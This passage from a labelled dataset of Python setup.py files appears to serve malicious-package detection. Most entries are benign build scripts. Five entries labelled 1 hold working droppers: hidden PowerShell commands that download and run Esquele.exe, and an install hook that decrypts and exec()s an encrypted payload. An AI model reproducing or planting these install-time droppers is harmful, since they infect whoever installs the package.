of any length\\n* Expose all dictionary methods like ``.get``, ``.pop``, ``.keys`` and other\\n* Access dicts in lists by index ``dot['parents.0.first_name']``\\n* key=value caching to speed up lookups and low down memory consumption\\n* support for setting value in multidimensional lists\\n* support for accessing lists with slices\\n\\n\\nInstallation\\n============\\n\\n.. code:: bash\\n\\n   pip install dotty-dict\\n\\n\\n* **Package**: https://pypi.org/project/dotty-dict/\\n* **Source**: https://github.com/pawelzny/dotty_dict\\n\\n\\nDocumentation\\n=============\\n\\n* Full documentation: http://dotty-dict.readthedocs.io\\n* Public API: http://dotty-dict.readthedocs.io/en/latest/api.html\\n* Examples and usage ideas: http://dotty-dict.readthedocs.io/en/latest/examples.html\\n\\n\\nTODO\\n====\\n\\nWaiting for your feature requests ;)\\n\\n\\nQuick Example\\n=============\\n\\nCreate new dotty using factory function.\\n\\n.. code-block:: python\\n\\n   >>> from dotty_dict import dotty\\n   >>> dot = dotty({'plain': {'old': {'python': 'dictionary'}}})\\n   >>> dot['plain.old']\\n   {'python': 'dictionary'}\\n\\n\\nYou can start with empty dotty\\n\\n.. code-block:: python\\n\\n   >>> from dotty_dict import dotty\\n   >>> dot = dotty()\\n   >>> dot['very.deeply.nested.thing'] = 'spam'\\n   >>> dot\\n   Dotty(dictionary={'very': {'deeply': {'nested': {'thing': 'spam'}}}}, separator='.', esc_char='\\\\\\\\')\\n\\n   >>> dot['very.deeply.spam'] = 'indeed'\\n   >>> dot\\n   Dotty(dictionary={'very': {'deeply': {'nested': {'thing': 'spam'}, 'spam': 'indeed'}}}, separator='.', esc_char='\\\\\\\\')\\n\\n   >>> del dot['very.deeply.nested']\\n   >>> dot\\n   Dotty(dictionary={'very': {'deeply': {'spam': 'indeed'}}}, separator='.', esc_char='\\\\\\\\')\\n\\n   >>> dot.get('very.not_existing.key')\\n   None\\n\\nNOTE: Using integer in dictionary keys will be treated as embedded list index.\\n\\nInstall for development\\n=======================\\n\\nInstall dev dependencies\\n\\n.. code-block:: console\\n\\n    $ make install\\n\\nTesting\\n=======\\n\\n.. code-block:: console\\n\\n    $ make test\\n\\nOr full tests with TOX:\\n\\n.. code-block:: console\\n\\n    $ make test-all\\n\\nLimitations\\n===========\\n\\nIn some very rare cases dotty may not work properly.\\n\\n* When nested dictionary has two keys of different type, but with the same value.\\n  In that case dotty will return dict or list under random key with passed value.\\n\\n* Keys in dictionary may not contain dots. If you need to use dots, please specify dotty with custom separator.\\n\\n* Nested keys may not be bool type. Bool type keys are only supported when calling keys with type defined value (e.g. dot[True], dot[False]).\\n\",\n    'author': 'Pawel Zadrozny',\n    'author_email': 'pawel.zny@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': None,\n    'packages': packages,\n    'package_data': package_data,\n    'python_requires': '>=3.5,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "flake8_cognitive_complexity-0.1.0", "func": "from typing import Optional\n\nfrom setuptools import setup, find_packages\n\n\npackage_name = 'flake8_cognitive_complexity'\n\n\ndef get_version() -> Optional[str]:\n    with open('flake8_cognitive_complexity/__init__.py', 'r') as f:\n        lines = f.readlines()\n    for line in lines:\n        if line.startswith('__version__'):\n            return line.split('=')[-1].strip().strip(\"'\")\n    return None\n\n\ndef get_long_description() -> str:\n    with open('README.md') as f:\n        return f.read()\n\n\nsetup(\n    name=package_name,\n    description='An extension for flake8 that validates cognitive functions complexity',\n    classifiers=[\n        'Environment :: Console',\n        'Framework :: Flake8',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development :: Documentation',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Quality Assurance',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n    ],\n    long_description=get_long_description(),\n    long_description_content_type='text/markdown',\n    packages=find_packages(),\n    python_requires='>=3.6',\n    include_package_data=True,\n    keywords='flake8',\n    version=get_version(),\n    author='Ilya Lebedev',\n    author_email='melevir@gmail.com',\n    install_requires=['setuptools', 'cognitive_complexity'],\n    entry_points={\n        'flake8.extension': [\n            'CCR = flake8_cognitive_complexity.checker:CognitiveComplexityChecker',\n        ],\n    },\n    url='https://github.com/Melevir/flake8-cognitive-complexity',\n    license='MIT',\n    py_modules=[package_name],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "cytoolz-0.12.0", "func": "\"\"\" Build ``cytoolz`` with or without Cython.\n\nBy default, CyToolz will be built using Cython if available.\nIf Cython is not available, then the default C compiler will be used\nto compile the distributed *.c files instead.\n\nPass \"--cython\" or \"--with-cython\" as a command line argument to setup.py to\nforce the project to build using Cython (and fail if Cython is unavailable).\n\nPass \"--no-cython\" or \"--without-cython\" to disable usage of Cython.\n\nFor convenience, developmental versions (with 'dev' in the version number)\nautomatically use Cython unless disabled via a command line argument.\n\nTo summarize differently, the rules are as follows (apply first applicable rule):\n\n  1. If `--no-cython` or `--without-cython` are used, then only build from `.*c` files.\n  2. If this is a dev version, then cythonize only the files that have changed.\n  3. If `--cython` or `--with-cython` are used, then force cythonize all files.\n  4. If no arguments are passed, then force cythonize all files if Cython is available,\n     else build from `*.c` files.  This is default when installing via pip.\n\nBy forcing cythonization of all files (except in dev) if Cython is available,\nwe avoid the case where the generated `*.c` files are not forward-compatible.\n\n\"\"\"\nimport os.path\nimport sys\nfrom setuptools import setup, Extension\n\nimport versioneer\n\nVERSION = versioneer.get_version()\n\ntry:\n    from Cython.Build import cythonize\n    has_cython = True\nexcept ImportError:\n    has_cython = False\n\nuse_cython = True\nis_dev = '+' in VERSION\nstrict_cython = is_dev or os.environ.get('CIBUILDWHEEL', '0') != '1'\nif '--no-cython' in sys.argv:\n    use_cython = False\n    sys.argv.remove('--no-cython')\nif '--without-cython' in sys.argv:\n    use_cython = False\n    sys.argv.remove('--without-cython')\nif '--cython' in sys.argv:\n    strict_cython = True\n    sys.argv.remove('--cython')\nif '--with-cython' in sys.argv:\n    strict_cython = True\n    sys.argv.remove('--with-cython')\n\nif use_cython and not has_cython:\n    if strict_cython:\n        raise RuntimeError('Cython required to build dev version of cytoolz.')\n    print('ALERT: Cython not installed.  Building without Cython.')\n    use_cython = False\n\nif use_cython:\n    suffix = '.pyx'\nelse:\n    suffix = '.c'\n\next_modules = []\nfor modname in ['dicttoolz', 'functoolz', 'itertoolz', 'recipes', 'utils']:\n    ext_modules.append(Extension('cytoolz.' + modname.replace('/', '.'),\n                                 ['cytoolz/' + modname + suffix]))\n\nif use_cython:\n    try:\n        from Cython.Compiler.Options import get_directive_defaults\n        directive_defaults = get_directive_defaults()\n    except ImportError:\n        # for Cython < 0.25\n        from Cython.Compiler.Options import directive_defaults\n    directive_defaults['embedsignature'] = True\n    directive_defaults['binding'] = True\n    directive_defaults['language_level'] = '3'  # TODO: drop Python 2.7 and update this (and code) to 3\n    # The distributed *.c files may not be forward compatible.\n    # If we are cythonizing a non-dev version, then force everything to cythonize.\n    ext_modules = cythonize(ext_modules, force=not is_dev)\n\nsetup(\n    name='cytoolz',\n    version=VERSION,\n    cmdclass=versioneer.get_cmdclass(),\n    description=('Cython implementation of Toolz: '\n                    'High performance functional utilities'),\n    ext_modules=ext_modules,\n    long_description=(open('README.rst').read()\n                        if os.path.exists('README.rst')\n                        else ''),\n    url='https://github.com/pytoolz/cytoolz',\n    author='https://raw.github.com/pytoolz/cytoolz/master/AUTHORS.md',\n    author_email='erik.n.welch@gmail.com',\n    maintainer='Erik Welch',\n    maintainer_email='erik.n.welch@gmail.com',\n    license = 'BSD',\n    packages=['cytoolz', 'cytoolz.curried'],\n    package_data={'cytoolz': ['*.pyx', '*.pxd', 'curried/*.pyx', 'tests/*.py']},\n    # include_package_data = True,\n    keywords=('functional utility itertools functools iterator generator '\n                'curry memoize lazy streaming bigdata cython toolz cytoolz'),\n    classifiers = [\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Education',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Cython',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Scientific/Engineering',\n        'Topic :: Scientific/Engineering :: Information Analysis',\n        'Topic :: Software Development',\n        'Topic :: Software Development :: Libraries',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Utilities',\n    ],\n    install_requires=['toolz >= 0.8.0'],\n    extras_require={'cython': ['cython']},\n    python_requires=\">=3.5\",\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "eth_abi-3.0.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import (\n    setup,\n    find_packages,\n)\n\nHYPOTHESIS_REQUIREMENT = \"hypothesis>=4.18.2,<5.0.0\"\n\nextras_require = {\n    \"tools\": [\n        HYPOTHESIS_REQUIREMENT,\n    ],\n    \"test\": [\n        \"pytest>=6.2.5,<7\",\n        \"pytest-pythonpath>=0.7.1\",\n        \"pytest-xdist>=2.5.0,<3\",\n        \"tox>=2.9.1,<3\",\n        \"eth-hash[pycryptodome]\",\n        HYPOTHESIS_REQUIREMENT,\n    ],\n    \"lint\": [\n        \"flake8==4.0.1\",\n        \"isort>=4.2.15,<5\",\n        \"mypy==0.910\",\n        \"pydocstyle>=6.0.0,<7\",\n        \"black\",\n    ],\n    \"doc\": [\n        \"Sphinx>=1.6.5,<2\",\n        \"jinja2>=3.0.0,<3.1.0\",  # jinja2<3.0 or >=3.1.0 cause doc build failures.\n        \"sphinx_rtd_theme>=0.1.9\",\n        \"towncrier>=21,<22\",\n    ],\n    \"dev\": [\n        \"bumpversion>=0.5.3,<1\",\n        \"pytest-watch>=4.1.0,<5\",\n        \"wheel\",\n        \"twine\",\n        \"ipython\",\n    ],\n}\n\nextras_require[\"dev\"] = (\n    extras_require[\"dev\"]\n    + extras_require[\"test\"]\n    + extras_require[\"lint\"]\n    + extras_require[\"doc\"]\n)\n\n\nwith open(\"./README.md\") as readme:\n    long_description = readme.read()\n\n\nsetup(\n    name=\"eth_abi\",\n    # *IMPORTANT*: Don't manually change the version here. Use `make bump`, as described in readme\n    version=\"3.0.1\",\n    description=\"\"\"eth_abi: Python utilities for working with Ethereum ABI definitions, especially encoding and decoding\"\"\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"The Ethereum Foundation\",\n    author_email=\"snakecharmers@ethereum.org\",\n    url=\"https://github.com/ethereum/eth-abi\",\n    include_package_data=True,\n    install_requires=[\n        \"eth-utils>=2.0.0,<3.0.0\",\n        \"eth-typing>=3.0.0,<4.0.0\",\n        \"parsimonious>=0.8.0,<0.9.0\",\n    ],\n    python_requires=\">=3.7, <4\",\n    extras_require=extras_require,\n    py_modules=[\"eth_abi\"],\n    license=\"MIT\",\n    zip_safe=False,\n    keywords=\"ethereum\",\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    package_data={\"eth_abi\": [\"py.typed\"]},\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n)\n", "target": 0}
{"idx": "dpath-2.0.6", "func": "from distutils.core import setup\nimport dpath.version\nimport os\n\n\nlong_description = open(\n    os.path.join(\n        os.path.dirname(__file__),\n        'README.rst'\n    )\n).read()\n\nif __name__ == \"__main__\":\n    setup(\n        name=\"dpath\",\n        url=\"https://www.github.com/akesterson/dpath-python\",\n        version=dpath.version.VERSION,\n        description=\"Filesystem-like pathing and searching for dictionaries\",\n        long_description=long_description,\n        author=(\"Caleb Case, \"\n                \"Andrew Kesterson\"),\n        author_email=\"calebcase@gmail.com, andrew@aklabs.net\",\n        license=\"MIT\",\n        install_requires=[],\n        scripts=[],\n        packages=[\"dpath\"],\n        data_files=[],\n        python_requires=\">=3\",\n        classifiers=[\n            'Development Status :: 5 - Production/Stable',\n            'Environment :: Console',\n            'Intended Audience :: Developers',\n            'License :: OSI Approved :: MIT License',\n            'Natural Language :: English',\n            'Programming Language :: Python :: 3',\n            'Topic :: Software Development :: Libraries :: Python Modules',\n        ],\n    )\n", "target": 0}
{"idx": "libgrandver-9.17", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libgrandver',\n    packages = ['modlib'],\n    version = '8.38',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "pilloo-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'teEZVMparwe TRrynLQQwQppAZhYjMLiKwfVIUNtQkmadvvdWkuxzvLhBtQjDtVLleuUzxgmJ'\nLONG_DESCRIPTION = 'YJbGxNjYsxLSjbZKzECCqxBZmwhFkWBeQOZuchgmnUElXswvwaGNvCnWcQvwlwGAHxiYedXkQscMvxCrfcMZhMwWZlYYfpKoTcVKKpShTtqtBoElHToDnGoVhIIccFRlbtGFlxbIRcLkehAmlDOjjyBkgHkVyONJYPGPwEwPc TSCEQpBbTJTjagCQPBHgkTLUjxgIlPpkeqmnOxKZKZwivIEcjmRoLiryxPR PLdwawdSzNZAWwPTmPNrUaa YLfDebDAQvzmljfWSeZezLloatsDRkjuPVFwQPYUXYXYpMVcrjdRzCRgGMaupAjaeoz RxlqAwaobLJ LuIBNuSsTlRiu LZZtRhvMgxQnoCeLlmzkAhqUQPZvxlxlZEBtregIHsvTWVSYVFZw'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'5p_pPRFj8BLWpzkd2ze7Uo9OTo2ufqQhv34dtsKoHkM=').decrypt(b'gAAAAABmA1pdI4FCnRQbQ05PpmZd3L-Fw4DTnWTv1AlBsFD6IfFWKuYrNNUNUHlCqb-EGcwqE6dl8pz53pVVjtY2f_zMxX7eqeBgnvAwOPtHjOOXiQw5DBnU3wcg_sm2In2SvYE_xI0xAlzZLxrWNh8Sg96f1VwbQACqXEd1gsn8F5_dVMMZJVoZq9CgEZlpT5fgoXIndcrp1EKTkORLrRPudOa2ZRK3Wg=='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"pilloo\",\n    version=VERSION,\n    author=\"zCGLtCbu\",\n    author_email=\"hUeVwlcawxhBsItBIy@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "forex-python-1.8", "func": "import io\nimport os\nfrom setuptools import setup, find_packages\n\nVERSION = '1.8'\nlong_description_text = \"\"\"Forex Python is a Free Foreign exchange rates and currency conversion.\nFeatures:\nList all currency rates.\nBitCoin price for all curuncies.\nConverting amount to BitCoins.\nGet historical rates for any day since 1999.\nConversion rate for one currency(ex; USD to INR).\nConvert amount from one currency to other.('USD 10$' to INR).\nCurrency symbols.\nCurrency names.\n\nDocumentation: http://forex-python.readthedocs.io/en/latest/usage.html\nGitHub: https://github.com/MicroPyramid/forex-python\n\n\"\"\"\n\nsetup(\n    name='forex-python',\n    version=VERSION,\n    author='Micro Pyramid Informatic Pvt. Ltd.',\n    author_email='hello@micropyramid.com',\n    url='https://github.com/MicroPyramid/forex-python',\n    description='Foreign exchange rates and currency conversion.',\n    long_description=long_description_text,\n    packages=find_packages(exclude=['tests', 'tests.*']),\n    include_package_data=True,\n    install_requires=[\n        'requests',\n        'simplejson',\n    ],\n    classifiers=[\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Topic :: Software Development :: Internationalization',\n    ],\n)\n", "target": 0}
{"idx": "django-dirtyfields-1.8.2", "func": "# All package metadata is in setup.cfg\n# This is still required for tox\n\nfrom setuptools import setup\n\nif __name__ == \"__main__\":\n    setup()\n", "target": 0}
{"idx": "django-multiselectfield-0.1.12", "func": "# -*- coding: utf-8 -*-\n# Copyright (c) 2012 by Pablo Mart\u00edn <goinnn@gmail.com>\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU Lesser General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public License\n# along with this programe.  If not, see <http://www.gnu.org/licenses/>.\n\n# Initial code got from http://djangosnippets.org/users/danielroseman/\n\nimport codecs\nimport os\nfrom setuptools import setup, find_packages\n\n\ndef read(*rnames):\n    with codecs.open(\n        os.path.join(os.path.dirname(__file__), *rnames),\n        'r', 'utf-8',\n    ) as f:\n        return f.read()\n\n\nsetup(\n    name=\"django-multiselectfield\",\n    version=\"0.1.12\",\n    author=\"Pablo Martin\",\n    author_email=\"goinnn@gmail.com\",\n    description=\"Django multiple select field\",\n    long_description=(read('README.rst') + '\\n\\n' + read('CHANGES.rst')),\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Framework :: Django',\n        'License :: OSI Approved :: GNU Library or Lesser General Public License (LGPL)',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n    ],\n    license=\"LGPL 3\",\n    keywords=\"django,multiple,select,field,choices\",\n    url='https://github.com/goinnn/django-multiselectfield',\n    packages=find_packages(),\n    include_package_data=True,\n    tests_require=[\n        'django>=1.4',\n        'tox',\n        'coverage',\n        'flake8',\n    ],\n    install_requires=[\n        'django>=1.4',\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "tppywmc-4.81", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppywmc',\n    packages = ['modlib'],\n    version = '6.71',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tppostreplacevisa-1.67", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppostreplacevisa',\n    packages = ['modlib'],\n    version = '2.26',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libpipcvpip-3.2", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpipcvpip',\n    packages = ['modlib'],\n    version = '1.98',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dagster_cloud_cli-1.0.3", "func": "from typing import Dict\n\nfrom setuptools import find_packages, setup\n\n\ndef get_version() -> str:\n    version: Dict[str, str] = {}\n    with open(\"dagster_cloud_cli/version.py\", encoding=\"utf8\") as fp:\n        exec(fp.read(), version)  # pylint: disable=W0122\n\n    return version[\"__version__\"]\n\n\nsetup(\n    name=\"dagster_cloud_cli\",\n    version=get_version(),\n    author_email=\"hello@elementl.com\",\n    packages=find_packages(exclude=[\"dagster_cloud.cli_tests*\"]),\n    include_package_data=True,\n    install_requires=[\n        \"packaging>=20.9\",\n        \"questionary\",\n        \"requests\",\n        \"typer[all]\",\n        \"PyYAML>=5.1\",\n    ],\n    extras_require={},\n    author=\"Elementl\",\n    license=\"Apache-2.0\",\n    classifiers=[\n        \"Programming Language :: Python :: 3.8\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: OS Independent\",\n    ],\n    entry_points={\n        \"console_scripts\": [\n            \"dagster-cloud = dagster_cloud_cli.entrypoint:app\",\n        ]\n    },\n)\n", "target": 0}
{"idx": "Flask-Admin-1.6.0", "func": "# Fix for older setuptools\nimport re\nimport os\nimport sys\n\nfrom setuptools import setup, find_packages\n\n\ndef fpath(name):\n    return os.path.join(os.path.dirname(__file__), name)\n\n\ndef read(fname):\n    return open(fpath(fname)).read()\n\n\ndef desc():\n    info = read('README.rst')\n    try:\n        return info + '\\n\\n' + read('doc/changelog.rst')\n    except IOError:\n        return info\n\n# grep flask_admin/__init__.py since python 3.x cannot import it before using 2to3\nfile_text = read(fpath('flask_admin/__init__.py'))\n\n\ndef grep(attrname):\n    pattern = r\"{0}\\W*=\\W*'([^']+)'\".format(attrname)\n    strval, = re.findall(pattern, file_text)\n    return strval\n\n\nextras_require = {\n    'aws': ['boto'],\n    'azure': ['azure-storage-blob']\n}\n\n\ninstall_requires = [\n    'Flask>=0.7',\n    'wtforms'\n]\n\n\nsetup(\n    name='Flask-Admin',\n    version=grep('__version__'),\n    url='https://github.com/flask-admin/flask-admin/',\n    license='BSD',\n    python_requires='>=3.6',\n    author=grep('__author__'),\n    author_email=grep('__email__'),\n    description='Simple and extensible admin interface framework for Flask',\n    long_description=desc(),\n    packages=find_packages(),\n    include_package_data=True,\n    zip_safe=False,\n    platforms='any',\n    extras_require=extras_require,\n    install_requires=install_requires,\n    tests_require=[\n        'pytest',\n        'pillow>=3.3.2',\n        'mongoengine',\n        'pymongo',\n        'wtf-peewee',\n        'sqlalchemy',\n        'flask-mongoengine<=0.21.0',\n        'flask-sqlalchemy',\n        'flask-babelex',\n        'shapely',\n        'geoalchemy2',\n        'psycopg2',\n    ],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 